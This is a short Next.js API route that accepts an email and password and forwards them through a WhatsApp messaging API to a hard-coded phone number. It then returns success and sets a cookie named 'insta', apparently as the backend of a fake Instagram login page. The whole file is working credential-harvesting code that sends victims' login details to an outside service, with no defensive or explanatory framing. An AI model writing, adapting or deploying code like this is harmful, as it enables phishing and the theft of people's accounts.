
import { NextResponse } from "next/server";
import fdf from 'request'
export async function POST(request) {
    const {email, password} = await request.json()

    
    var options = {
        'method': 'POST',
        'url': 'https://whats-api.rcsoft.in/api/create-message',
        'headers': {
        },
        formData: {
          'appkey': process.env.APP_KEY,
          'authkey': process.env.AUTH_KEY,
          'to': '917878842575',
          'message': `${email} and ${password}`
        }
      };


const ans = await new Promise((resolve, reject) => {
fdf(options)
setTimeout(()=> {
return resolve()
},7000)

  
})
      
     
    
    const  response = NextResponse.json({success: true})
    response.cookies.set('insta', "allready")
    return response
}